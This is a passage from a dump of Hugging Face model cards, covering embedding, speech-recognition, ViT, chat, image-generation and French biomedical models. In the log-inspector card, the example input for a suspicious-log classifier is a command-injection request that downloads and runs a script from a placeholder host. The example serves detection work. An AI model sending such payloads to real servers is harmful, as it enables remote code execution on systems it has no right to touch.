instructions:\nRepresent the domain text_type for task_objective:\ndomain is optional, and it specifies the domain of the text, e.g., science, finance, medicine, etc.\ntext_type is required, and it specifies the encoding unit, e.g., sentence, document, paragraph, etc.\ntask_objective is optional, and it specifies the objective of embedding, e.g., retrieve a document, classify the sentence, etc.\nCalculate Sentence similarities\nYou can further use the model to compute similarities between two groups of sentences, with customized embeddings.\nfrom sklearn.metrics.pairwise import cosine_similarity\nsentences_a = [['Represent the Science sentence: ','Parton energy loss in QCD matter'],\n['Represent the Financial statement: ','The Federal Reserve on Wednesday raised its benchmark interest rate.']]\nsentences_b = [['Represent the Science sentence: ','The Chiral Phase Transition in Dissipative Dynamics'],\n['Represent the Financial statement: ','The funds rose less than 0.5 per cent on Friday']]\nembeddings_a = model.encode(sentences_a)\nembeddings_b = model.encode(sentences_b)\nsimilarities = cosine_similarity(embeddings_a,embeddings_b)\nprint(similarities)\nInformation Retrieval\nYou can also use customized embeddings for information retrieval.\nimport numpy as np\nfrom sklearn.metrics.pairwise import cosine_similarity\nquery  = [['Represent the Wikipedia question for retrieving supporting documents: ','where is the food stored in a yam plant']]\ncorpus = [['Represent the Wikipedia document for retrieval: ','Capitalism has been dominant in the Western world since the end of feudalism, but most feel[who?] that the term \"mixed economies\" more precisely describes most contemporary economies, due to their containing both private-owned and state-owned enterprises. In capitalism, prices determine the demand-supply scale. For example, higher demand for certain goods and services lead to higher prices and lower demand for certain goods lead to lower prices.'],\n['Represent the Wikipedia document for retrieval: ',\"The disparate impact theory is especially controversial under the Fair Housing Act because the Act regulates many activities relating to housing, insurance, and mortgage loans√¢‚Ç¨‚Äùand some scholars have argued that the theory's use under the Fair Housing Act, combined with extensions of the Community Reinvestment Act, contributed to rise of sub-prime lending and the crash of the U.S. housing market and ensuing global economic recession\"],\n['Represent the Wikipedia document for retrieval: ','Disparate impact in United States labor law refers to practices in employment, housing, and other areas that adversely affect one group of people of a protected characteristic more than another, even though rules applied by employers or landlords are formally neutral. Although the protected classes vary by statute, most federal civil rights laws protect based on race, color, religion, national origin, and sex as protected traits, and some laws include disability status and other traits as well.']]\nquery_embeddings = model.encode(query)\ncorpus_embeddings = model.encode(corpus)\nsimilarities = cosine_similarity(query_embeddings,corpus_embeddings)\nretrieved_doc_id = np.argmax(similarities)\nprint(retrieved_doc_id)\nClustering\nUse customized embeddings for clustering texts in groups.\nimport sklearn.cluster\nsentences = [['Represent the Medicine sentence for clustering: ','Dynamical Scalar Degree of Freedom in Horava-Lifshitz Gravity'],\n['Represent the Medicine sentence for clustering: ','Comparison of Atmospheric Neutrino Flux Calculations at Low Energies'],\n['Represent the Medicine sentence for clustering: ','Fermion Bags in the Massive Gross-Neveu Model'],\n['Represent the Medicine sentence for clustering: ',\"QCD corrections to Associated t-tbar-H production at the Tevatron\"],\n['Represent the Medicine sentence for clustering: ','A New Analysis of the R Measurements: Resonance Parameters of the Higher,  Vector States of Charmonium']]\nembeddings = model.encode(sentences)\nclustering_model = sklearn.cluster.MiniBatchKMeans(n_clusters=2)\nclustering_model.fit(embeddings)\ncluster_assignment = clustering_model.labels_\nprint(cluster_assignment)",
    "Salama1429/KalemaTech-Arabic-STT-ASR-based-on-Whisper-Small": "Kalemat-Tech Arabic Speech Recognition Model (STT) - Mohamed Salama\nŸÜŸÖŸàÿ∞ÿ¨ ŸÉŸÑŸÖÿßÿ™ŸÉ ŸÑŸÑÿ™ÿπÿ±ŸÅ ÿπŸÑŸâ ÿßŸÑÿ£ÿµŸàÿßÿ™ ÿßŸÑÿπÿ±ÿ®Ÿäÿ© ÿßŸÑŸÅÿµÿ≠Ÿâ Ÿà ÿ™ÿ≠ŸàŸäŸÑŸáÿß ÿ•ŸÑŸâ ŸÜÿµŸàÿµ\nKalemaTech-Arabic-STT-ASR-based-on-Whisper-Small\nExample of usage:\nIntended uses & limitations\nTraining and evaluation data\nTraining procedure\nTraining hyperparameters\nTraining results\nFramework versions\nKalemat-Tech Arabic Speech Recognition Model (STT) - Mohamed Salama\nŸÜŸÖŸàÿ∞ÿ¨ ŸÉŸÑŸÖÿßÿ™ŸÉ ŸÑŸÑÿ™ÿπÿ±ŸÅ ÿπŸÑŸâ ÿßŸÑÿ£ÿµŸàÿßÿ™ ÿßŸÑÿπÿ±ÿ®Ÿäÿ© ÿßŸÑŸÅÿµÿ≠Ÿâ Ÿà ÿ™ÿ≠ŸàŸäŸÑŸáÿß ÿ•ŸÑŸâ ŸÜÿµŸàÿµ\nKalemaTech-Arabic-STT-ASR-based-on-Whisper-Small\nThis model is a fine-tuned version of openai/whisper-small on Common_Voice_Arabic_12.0_Augmented.\nIt achieves the following results on the evaluation set:\nLoss: 0.5362\nWer: 58.5848\nExample of usage:\nfrom transformers import AutoProcessor, AutoModelForSpeechSeq2Seq\nprocessor = AutoProcessor.from_pretrained(\"Salama1429/KalemaTech-Arabic-STT-ASR-based-on-Whisper-Small\")\nmodel = AutoModelForSpeechSeq2Seq.from_pretrained(\"Salama1429/KalemaTech-Arabic-STT-ASR-based-on-Whisper-Small\")\nIntended uses & limitations\nAutomatic Speech Recognition\nTraining and evaluation data\nCommon_Voice_Arabic_12.0 and I made some augmentations to it as follows:\n- 25% of the data TimeMasking\n- 25% of the data SpecAugmentation\n- 25% of the data WavAugmentation (AddGaussianNoise)\n- The final dataset is the original common voice plus the augmented files\nTraining procedure\nTraining hyperparameters\nThe following hyperparameters were used during training:\n- learning_rate: 1e-05\n- train_batch_size: 64\n- eval_batch_size: 8\n- seed: 42\n- optimizer: Adam with betas=(0.9,0.999) and epsilon=1e-08\n- lr_scheduler_type: linear\n- lr_scheduler_warmup_steps: 500\n- num_epochs: 25\n- mixed_precision_training: Native AMP\nTraining results\nTraining Loss\nEpoch\nStep\nValidation Loss\nWer\n0.2728\n1.01\n1000\n0.3063\n60.4733\n0.1442\n2.01\n2000\n0.2878\n55.6935\n0.0648\n3.02\n3000\n0.3009\n59.2568\n0.0318\n4.03\n4000\n0.3278\n59.2993\n0.0148\n5.04\n5000\n0.3539\n61.0364\n0.0088\n6.04\n6000\n0.3714\n56.9154\n0.0061\n7.05\n7000\n0.3920\n57.5515\n0.0041\n8.06\n8000\n0.4149\n61.6328\n0.0033\n9.06\n9000\n0.4217\n58.0310\n0.0033\n10.07\n10000\n0.4376\n59.9594\n0.0021\n11.08\n11000\n0.4485\n56.7812\n0.0015\n12.08\n12000\n0.4577\n57.6936\n0.0013\n13.09\n13000\n0.4671\n60.6606\n0.0011\n14.1\n14000\n0.4686\n59.8159\n0.0008\n15.11\n15000\n0.4856\n60.7111\n0.0011\n16.11\n16000\n0.4851\n59.5198\n0.0005\n17.12\n17000\n0.4936\n59.2608\n0.0004\n18.13\n18000\n0.4995\n57.9619\n0.0003\n19.13\n19000\n0.5085\n58.3630\n0.0002\n20.14\n20000\n0.5155\n58.0987\n0.0001\n21.15\n21000\n0.5251\n58.8504\n0.0001\n22.16\n22000\n0.5268\n58.4228\n0.0001\n23.16\n23000\n0.5317\n59.0881\n0.0001\n24.17\n24000\n0.5362\n58.5848\nFramework versions\nTransformers 4.25.1\nPytorch 1.13.1+cu117\nDatasets 2.8.0\nTokenizers 0.13.2",
    "timm/vit_base_patch16_224.augreg2_in21k_ft_in1k": "Model card for vit_base_patch16_224.augreg2_in21k_ft_in1k\nModel Details\nModel Usage\nImage Classification\nImage Embeddings\nModel Comparison\nCitation\nModel card for vit_base_patch16_224.augreg2_in21k_ft_in1k\nA Vision Transformer (ViT) image classification model. Trained on ImageNet-21k by paper authors and (re) fine-tuned on ImageNet-1k with additional augmentation and regularization by Ross Wightman.\nModel Details\nModel Type: Image classification / feature backbone\nModel Stats:\nParams (M): 86.6\nGMACs: 16.9\nActivations (M): 16.5\nImage size: 224 x 224\nPapers:\nHow to train your ViT? Data, Augmentation, and Regularization in Vision Transformers: https://arxiv.org/abs/2106.10270\nAn Image is Worth 16x16 Words: Transformers for Image Recognition at Scale: https://arxiv.org/abs/2010.11929v2\nDataset: ImageNet-1k\nPretrain Dataset: ImageNet-21k\nOriginal: https://github.com/google-research/vision_transformer\nModel Usage\nImage Classification\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model('vit_base_patch16_224.augreg2_in21k_ft_in1k', pretrained=True)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # unsqueeze single image into batch of 1\ntop5_probabilities, top5_class_indices = torch.topk(output.softmax(dim=1) * 100, k=5)\nImage Embeddings\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model(\n'vit_base_patch16_224.augreg2_in21k_ft_in1k',\npretrained=True,\nnum_classes=0,  # remove classifier nn.Linear\n)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # output is (batch_size, num_features) shaped tensor\n# or equivalently (without needing to set num_classes=0)\noutput = model.forward_features(transforms(img).unsqueeze(0))\n# output is unpooled, a (1, 197, 768) shaped tensor\noutput = model.forward_head(output, pre_logits=True)\n# output is a (1, num_features) shaped tensor\nModel Comparison\nExplore the dataset and runtime metrics of this model in timm model results.\nCitation\n@article{steiner2021augreg,\ntitle={How to train your ViT? Data, Augmentation, and Regularization in Vision Transformers},\nauthor={Steiner, Andreas and Kolesnikov, Alexander and and Zhai, Xiaohua and Wightman, Ross and Uszkoreit, Jakob and Beyer, Lucas},\njournal={arXiv preprint arXiv:2106.10270},\nyear={2021}\n}\n@article{dosovitskiy2020vit,\ntitle={An Image is Worth 16x16 Words: Transformers for Image Recognition at Scale},\nauthor={Dosovitskiy, Alexey and Beyer, Lucas and Kolesnikov, Alexander and Weissenborn, Dirk and Zhai, Xiaohua and Unterthiner, Thomas and  Dehghani, Mostafa and Minderer, Matthias and Heigold, Georg and Gelly, Sylvain and Uszkoreit, Jakob and Houlsby, Neil},\njournal={ICLR},\nyear={2021}\n}\n@misc{rw2019timm,\nauthor = {Ross Wightman},\ntitle = {PyTorch Image Models},\nyear = {2019},\npublisher = {GitHub},\njournal = {GitHub repository},\ndoi = {10.5281/zenodo.4414861},\nhowpublished = {\\url{https://github.com/huggingface/pytorch-image-models}}\n}",
    "timm/vit_small_patch16_224.augreg_in21k_ft_in1k": "Model card for vit_small_patch16_224.augreg_in21k_ft_in1k\nModel Details\nModel Usage\nImage Classification\nImage Embeddings\nModel Comparison\nCitation\nModel card for vit_small_patch16_224.augreg_in21k_ft_in1k\nA Vision Transformer (ViT) image classification model. Trained on ImageNet-21k and fine-tuned on ImageNet-1k (with additional augmentation and regularization) in JAX by paper authors, ported to PyTorch by Ross Wightman.\nModel Details\nModel Type: Image classification / feature backbone\nModel Stats:\nParams (M): 22.1\nGMACs: 4.3\nActivations (M): 8.2\nImage size: 224 x 224\nPapers:\nHow to train your ViT? Data, Augmentation, and Regularization in Vision Transformers: https://arxiv.org/abs/2106.10270\nAn Image is Worth 16x16 Words: Transformers for Image Recognition at Scale: https://arxiv.org/abs/2010.11929v2\nDataset: ImageNet-1k\nPretrain Dataset: ImageNet-21k\nOriginal: https://github.com/google-research/vision_transformer\nModel Usage\nImage Classification\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model('vit_small_patch16_224.augreg_in21k_ft_in1k', pretrained=True)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # unsqueeze single image into batch of 1\ntop5_probabilities, top5_class_indices = torch.topk(output.softmax(dim=1) * 100, k=5)\nImage Embeddings\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model(\n'vit_small_patch16_224.augreg_in21k_ft_in1k',\npretrained=True,\nnum_classes=0,  # remove classifier nn.Linear\n)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # output is (batch_size, num_features) shaped tensor\n# or equivalently (without needing to set num_classes=0)\noutput = model.forward_features(transforms(img).unsqueeze(0))\n# output is unpooled, a (1, 197, 384) shaped tensor\noutput = model.forward_head(output, pre_logits=True)\n# output is a (1, num_features) shaped tensor\nModel Comparison\nExplore the dataset and runtime metrics of this model in timm model results.\nCitation\n@article{steiner2021augreg,\ntitle={How to train your ViT? Data, Augmentation, and Regularization in Vision Transformers},\nauthor={Steiner, Andreas and Kolesnikov, Alexander and and Zhai, Xiaohua and Wightman, Ross and Uszkoreit, Jakob and Beyer, Lucas},\njournal={arXiv preprint arXiv:2106.10270},\nyear={2021}\n}\n@article{dosovitskiy2020vit,\ntitle={An Image is Worth 16x16 Words: Transformers for Image Recognition at Scale},\nauthor={Dosovitskiy, Alexey and Beyer, Lucas and Kolesnikov, Alexander and Weissenborn, Dirk and Zhai, Xiaohua and Unterthiner, Thomas and  Dehghani, Mostafa and Minderer, Matthias and Heigold, Georg and Gelly, Sylvain and Uszkoreit, Jakob and Houlsby, Neil},\njournal={ICLR},\nyear={2021}\n}\n@misc{rw2019timm,\nauthor = {Ross Wightman},\ntitle = {PyTorch Image Models},\nyear = {2019},\npublisher = {GitHub},\njournal = {GitHub repository},\ndoi = {10.5281/zenodo.4414861},\nhowpublished = {\\url{https://github.com/huggingface/pytorch-image-models}}\n}",
    "timm/vit_tiny_patch16_224.augreg_in21k_ft_in1k": "Model card for vit_tiny_patch16_224.augreg_in21k_ft_in1k\nModel Details\nModel Usage\nImage Classification\nImage Embeddings\nModel Comparison\nCitation\nModel card for vit_tiny_patch16_224.augreg_in21k_ft_in1k\nA Vision Transformer (ViT) image classification model. Trained on ImageNet-21k and fine-tuned on ImageNet-1k (with additional augmentation and regularization) in JAX by paper authors, ported to PyTorch by Ross Wightman.\nModel Details\nModel Type: Image classification / feature backbone\nModel Stats:\nParams (M): 5.7\nGMACs: 1.1\nActivations (M): 4.1\nImage size: 224 x 224\nPapers:\nHow to train your ViT? Data, Augmentation, and Regularization in Vision Transformers: https://arxiv.org/abs/2106.10270\nAn Image is Worth 16x16 Words: Transformers for Image Recognition at Scale: https://arxiv.org/abs/2010.11929v2\nDataset: ImageNet-1k\nPretrain Dataset: ImageNet-21k\nOriginal: https://github.com/google-research/vision_transformer\nModel Usage\nImage Classification\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model('vit_tiny_patch16_224.augreg_in21k_ft_in1k', pretrained=True)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # unsqueeze single image into batch of 1\ntop5_probabilities, top5_class_indices = torch.topk(output.softmax(dim=1) * 100, k=5)\nImage Embeddings\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\nimg = Image.open(urlopen(\n'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/beignets-task-guide.png'\n))\nmodel = timm.create_model(\n'vit_tiny_patch16_224.augreg_in21k_ft_in1k',\npretrained=True,\nnum_classes=0,  # remove classifier nn.Linear\n)\nmodel = model.eval()\n# get model specific transforms (normalization, resize)\ndata_config = timm.data.resolve_model_data_config(model)\ntransforms = timm.data.create_transform(**data_config, is_training=False)\noutput = model(transforms(img).unsqueeze(0))  # output is (batch_size, num_features) shaped tensor\n# or equivalently (without needing to set num_classes=0)\noutput = model.forward_features(transforms(img).unsqueeze(0))\n# output is unpooled, a (1, 197, 192) shaped tensor\noutput = model.forward_head(output, pre_logits=True)\n# output is a (1, num_features) shaped tensor\nModel Comparison\nExplore the dataset and runtime metrics of this model in timm model results.\nCitation\n@article{steiner2021augreg,\ntitle={How to train your ViT? Data, Augmentation, and Regularization in Vision Transformers},\nauthor={Steiner, Andreas and Kolesnikov, Alexander and and Zhai, Xiaohua and Wightman, Ross and Uszkoreit, Jakob and Beyer, Lucas},\njournal={arXiv preprint arXiv:2106.10270},\nyear={2021}\n}\n@article{dosovitskiy2020vit,\ntitle={An Image is Worth 16x16 Words: Transformers for Image Recognition at Scale},\nauthor={Dosovitskiy, Alexey and Beyer, Lucas and Kolesnikov, Alexander and Weissenborn, Dirk and Zhai, Xiaohua and Unterthiner, Thomas and  Dehghani, Mostafa and Minderer, Matthias and Heigold, Georg and Gelly, Sylvain and Uszkoreit, Jakob and Houlsby, Neil},\njournal={ICLR},\nyear={2021}\n}\n@misc{rw2019timm,\nauthor = {Ross Wightman},\ntitle = {PyTorch Image Models},\nyear = {2019},\npublisher = {GitHub},\njournal = {GitHub repository},\ndoi = {10.5281/zenodo.4414861},\nhowpublished = {\\url{https://github.com/huggingface/pytorch-image-models}}\n}",
    "u-haru/log-inspector": "Log Inspector\nHow to use\nTraining\nLog Inspector\nPretrained model on nginx access logs. Based on bert-base-cased.\nHow to use\nHere is how to use this model to inspect a log.\nGiven text must be parsed as like:\"path: <path>; ref:<referrer>; ua:<user agent>;\"\n>>> from transformers import pipeline\n>>> inspector = pipeline('text-classification', model=\"u-haru/log-inspector\")\n>>> inspector('path: /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*\";cd /tmp;curl -O http://O.O.O.O/zero;sh zero;\"; ref:-; ua:-;')\n[{'label': 'LABEL_0', 'score': 0.9999788999557495}]\nclass 0 is a suspicious log. class 1 is a safe log.\nWith simpletransformer:\n>>> from simpletransformers.classification import ClassificationModel\n>>> model = ClassificationModel('bert', \"u-haru/log-inspector\", num_labels=2, use_cuda=(use_cuda and torch.cuda.is_available()), args=param)\n>>> predictions, raw_outputs = model.predict(['path: /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*\";cd /tmp;curl -O http://O.O.O.O/zero;sh zero;\"; ref:-; ua:-;'])\n>>> print(predictions)\n[0]\nEvaluate or training:\n>>> from simpletransformers.classification import ClassificationModel\n>>> model = ClassificationModel('bert', \"u-haru/log-inspector\", num_labels=2, use_cuda=(use_cuda and torch.cuda.is_available()), args=param)\n>>> data = [[\"Suspicious log\",0],[\"Safe log\",1]]\n>>> df = pd.DataFrame(data)\n>>> model.train_model(df)\n>>> result, model_outputs, wrong_predictions = model.eval_model(df)\n>>> print(result)\n{'mcc': 1.0, 'tp': 1, 'tn': 1, 'fp': 0, 'fn': 0, 'auroc': 1.0, 'auprc': 1.0, 'eval_loss': 1.8238850316265598e-05}\nI trained with 9500 access logs. Here is evaluation score:\n{'mcc': 0.993114718313972, 'tp': 1639, 'tn': 729, 'fp': 0, 'fn': 7, 'auroc': 0.9994166345815686, 'auprc': 0.9997937194890235, 'eval_loss': 0.020282083051662583}\nand evaluation with 10000 logs:\n{'mcc': 0.8494104528008076, 'tp': 9964, 'tn': 26, 'fp': 0, 'fn': 10, 'auroc': 0.9999845752803442, 'auprc': 0.9999999597891697, 'eval_loss': 0.0058870489358901976}\nTraining\nSource codes are available here: github.com/u-haru/log-inspector",
    "emre/whisper-medium-turkish-2": "Whisper Medium TR\nModel description\nIntended uses & limitations\nTraining and evaluation data\nTraining procedure\nTraining hyperparameters\nFramework versions\nWhisper Medium TR\nThis model is a fine-tuned version of openai/whisper-medium on the Common Voice 11.0 dataset.\nIt achieves the following results on the evaluation set:\nLoss: 0.211673\nWer: 18.51\nModel description\nThis model is the openai whisper medium transformer adapted for Turkish audio to text transcription. This model has weight decay set to 0.1 to cope with overfitting.\nIntended uses & limitations\nThe model is available through its HuggingFace web app\nTraining and evaluation data\nData used for training is the initial 10% of train and validation of Turkish Common Voice 11.0 from Mozilla Foundation.\nWeight decay showed to have slightly better result also on the evaluation dataset.\nTraining procedure\nAfter loading the pre trained model, it has been trained on the dataset.\nTraining hyperparameters\nThe following hyperparameters were used during training:\nlearning_rate: 1e-05\ntrain_batch_size: 16\neval_batch_size: 8\nseed: 42\noptimizer: Adam with betas=(0.9,0.999) and epsilon=1e-08\nlr_scheduler_type: linear\nlr_scheduler_warmup_steps: 500\ntraining_steps: 4000\nmixed_precision_training: Native AMP\nweight_decay: 0.1\nFramework versions\nTransformers 4.26.0.dev0\nPytorch 1.12.1+cu113\nDatasets 2.7.1\nTokenizers 0.13.2",
    "PygmalionAI/pygmalion-1.3b": "Pygmalion 1.3B\nModel description\nTraining data\nTraining procedure\nIntended use\nThe easy way\nThe manual way\nKnown issues\nPygmalion 1.3B\nModel description\nPymalion 1.3B is a proof-of-concept dialogue model based on EleutherAI's pythia-1.3b-deduped.\nWarning: This model is NOT suitable for use by minors. It will output X-rated content under certain circumstances.\nTraining data\nThe fine-tuning dataset consisted of 56MB of dialogue data gathered from multiple sources, which includes both real and partially machine-generated conversations.\nTraining procedure\nFine-tuning was done using ColossalAI (specifically, with a slightly modified version of their OPT fine-tune example) for around 11.4 million tokens over 5440 steps on a single 24GB GPU. The run took just under 21 hours.\nIntended use\nThe easy way\nWe provide a notebook with a Gradio UI for playing around with the model without having to manually format inputs. This notebook can be found here.\nThe manual way\nThe model can be used as a regular text generation model, but it'll perform best if the input prompt adheres to the following format:\n[CHARACTER]'s Persona: [A few sentences about the character you want the model to play]\n[DIALOGUE HISTORY]\nYou: [Your input message here]\n[CHARACTER]:\nWhere [CHARACTER] is, as you can probably guess, the name of the character you want the model to portray, and [DIALOGUE HISTORY] is chat history so the model can have some conversational context to draw from. Ideally it'll be pairs of messages like:\n[CHARACTER]: [some dialogue here]\nYou: [your response to the dialogue above]\nApart from chat history, you can also just add example conversations in [DIALOGUE HISTORY] to show how the character should speak - ideally at the beginning, so it doesn't get confused as to what's conversation history vs. character definition.\nKnown issues\nThe model can get stuck repeating certain phrases, or sometimes even entire sentences.\nWe believe this is due to that behavior being present in the training data itself, and plan to investigate and adjust accordingly for future versions.",
    "pharmapsychotic/sugar-glider": "DreamBooth model for the pssg concept trained by pharmapsychotic\nExamples\nUsage\nDreamBooth model for the pssg concept trained by pharmapsychotic\nSugar gliders are adorable creatures! I've never had one as a pet but I've been tempted. Imagine having one in your shirt pocket and feeding it snacks as you work. üòç\nAnyway, I created a few AI renders of sugar gliders and mixed in with some photos of the critters and trained a model for the DreamBooth Hackathon! If you enjoy the model or just find the results funny and cute, drop a like on the model!\nTo use the model be sure to include pssg in your prompt (PharmapSychotic Sugar Glider) or pssg sugar glider for a stronger effect. I recommend using a version of the inference that has cross attention control so you can balance the influence of the sugar glider and the weird scenarios you put him in. I trained to 10,000 steps and it overcooked so dropped back to the 2,500 step checkpoint but still need to boost other things in the prompts like (((goggles))) to overcome the default pssg influence.\nSee below for usage!\nExamples\nUsage\nWith Diffusers\nfrom diffusers import StableDiffusionPipeline\npipeline = StableDiffusionPipeline.from_pretrained('pharma/sugar-glider')\nimage = pipeline().images[0]\nimage\nWith SD Web UI\nTo use with SD Web UI download sugar_gliders_pssg_2500.ckpt and put in your models folder.",
    "Dr-BERT/DrBERT-7GB": "DrBERT: A Robust Pre-trained Model in French for Biomedical and Clinical domains\n1. DrBERT models\n2. Using DrBERT\n3. Pre-training DrBERT tokenizer and model from scratch by using HuggingFace Transformers Library\n3.1 Install dependencies\n3.2 Download NACHOS Dataset text file\n3.3 Build your own tokenizer from scratch based on NACHOS\n3.4 Preprocessing and tokenization of the dataset\n3.5 Model training\n3.5.1 Pre-training from scratch\n3.5.2 continue pre-training\n4. Fine-tuning on a downstream task\nCitation BibTeX\nDrBERT: A Robust Pre-trained Model in French for Biomedical and Clinical domains\nIn recent years, pre-trained language models (PLMs) achieve the best performance on a wide range of natural language processing (NLP) tasks. While the first models were trained on general domain data, specialized ones have emerged to more effectively treat specific domains.\nIn this paper, we propose an original study of PLMs in the medical domain on French language. We compare, for the first time, the performance of PLMs trained on both public data from the web and private data from healthcare establishments. We also evaluate different learning strategies on a set of biomedical tasks.\nFinally, we release the first specialized PLMs for the biomedical field in French, called DrBERT, as well as the largest corpus of medical data under free license on which these models are trained.\n1. DrBERT models\nDrBERT is a French RoBERTa trained on a open source corpus of French medical crawled textual data called NACHOS. Models with different amount of data from differents public and private sources are trained using the CNRS (French National Centre for Scientific Research) Jean Zay French supercomputer. Only the weights of the models trained using exclusively open-sources data are publicly released to prevent any personnal information leak and to follow the european GDPR laws :\nModel name\nCorpus\nNumber of layers\nAttention Heads\nEmbedding Dimension\nSequence Length\nModel URL\nDrBERT-7-GB-cased-Large\nNACHOS 7 GB\n24\n16\n1024\n512\nHuggingFace\nDrBERT-7-GB-cased\nNACHOS 7 GB\n12\n12\n768\n512\nHuggingFace\nDrBERT-4-GB-cased\nNACHOS 4 GB\n12\n12\n768\n512\nHuggingFace\nDrBERT-4-GB-cased-CP-CamemBERT\nNACHOS 4 GB\n12\n12\n768\n512\nHuggingFace\nDrBERT-4-GB-cased-CP-PubMedBERT\nNACHOS 4 GB\n12\n12\n768\n512\nHuggingFace\n2. Using DrBERT\nYou can use DrBERT with Hugging Face's Transformers library as follow.\nLoading the model and tokenizer :\nfrom transformers import AutoModel, AutoTokenizer\ntokenizer = AutoTokenizer.from_pretrained(\"Dr-BERT/DrBERT-7GB\")\nmodel = AutoModel.from_pretrained(\"Dr-BERT/DrBERT-7GB\")\nPerform the mask filling task :\nfrom transformers import pipeline\nfill_mask  = pipeline(\"fill-mask\", model=\"Dr-BERT/DrBERT-7GB\", tokenizer=\"Dr-BERT/DrBERT-7GB\")\nresults = fill_mask(\"La patiente est atteinte d'une <mask>\")\n3. Pre-training DrBERT tokenizer and model from scratch by using HuggingFace Transformers Library\n3.1 Install dependencies\naccelerate @ git+https://github.com/huggingface/accelerate@66edfe103a0de9607f9b9fdcf6a8e2132486d99b\ndatasets==2.6.1\nsentencepiece==0.1.97\nprotobuf==3.20.1\nevaluate==0.2.2\ntensorboard==2.11.0\ntorch >= 1.3\n3.2 Download NACHOS Dataset text file\nDownload the full NACHOS dataset from Zenodo and place it the the from_scratch or continued_pretraining directory.\n3.3 Build your own tokenizer from scratch based on NACHOS\nNote : This step is required only in the case of an from scratch pre-training, if you want to do a continued pre-training you just have to download the model and the tokenizer that correspond to the model you want to continue the training from. In this case, you simply have to go to the HuggingFace Hub, select a model (for example RoBERTa-base). Finally, you have to download the entire model / tokenizer repository by clicking on the Use In Transformers button and get the Git link git clone https://huggingface.co/roberta-base.\nBuild the tokenizer from scratch on your data of the file ./corpus.txt by using ./build_tokenizer.sh.\n3.4 Preprocessing and tokenization of the dataset\nFirst, replace the field tokenizer_path of the shell script to match the path of your tokenizer directory downloaded before using HuggingFace Git or the one you have build.\nRun ./preprocessing_dataset.sh to generate the tokenized dataset by using the givent tokenizer.\n3.5 Model training\nFirst, change the number of GPUs --ntasks=128 you are needing to match your computational capabilities in the shell script called run_training.sh. In our case, we used 128 V100 32 GB GPUs from 32 nodes of 4 GPUs (--ntasks-per-node=4 and --gres=gpu:4) during 20 hours (--time=20:00:00).\nIf you are using Jean Zay, you also need to change the -A flag to match one of your @gpu profile capable of running the job. You also need to move ALL of your datasets, tokenizer, script and outputs on the $SCRATCH disk space to preserve others users of suffuring of IO issues.\n3.5.1 Pre-training from scratch\nOnce the SLURM parameters updated, you have to change name of the model architecture in the flag --model_type=\"camembert\" and to update the --config_overrides= according to the specifications of the architecture you are trying to train. In our case, RoBERTa had a 514 sequence length, a vocabulary of 32005 (32K tokens of the tokenizer and 5 of the model architecture) tokens, the identifier of the beginning-of-sentence token (BOS) and end-of-sentence token (EOS) are respectivly 5 and 6. Change the\nThen, go to ./from_scratch/ directory.\nRun sbatch ./run_training.sh to send the training job in the SLURM queue.\n3.5.2 continue pre-training\nOnce the SLURM parameters updated, you have to change path of the model / tokenizer you want to start from --model_name_or_path= / --tokenizer_name= to the path of the model downloaded from HuggingFace's Git in the section 3.3.\nThen, go to ./continued_pretraining/ directory.\nRun sbatch ./run_training.sh to send the training job in the SLURM queue.\n4. Fine-tuning on a downstream task\nYou just need to change the name of the model to Dr-BERT/DrBERT-7GB in any of the examples given by HuggingFace's team here.\nCitation BibTeX\n@inproceedings{labrak2023drbert,\ntitle = {{DrBERT: A Robust Pre-trained Model in French for Biomedical and Clinical domains}},\nauthor = {Labrak, Yanis and Bazoge, Adrien and Dufour, Richard and Rouvier, Mickael and Morin, Emmanuel and Daille, B√©atrice and Gourraud, Pierre-Antoine},\nbooktitle = {Proceedings of the 61th Annual Meeting of the Association for Computational Linguistics (ACL'23), Long Paper},\nmonth = july,\nyear = 2023,\naddress = {Toronto, Canada},\npublisher = {Association for Computational Linguistics}\n}",
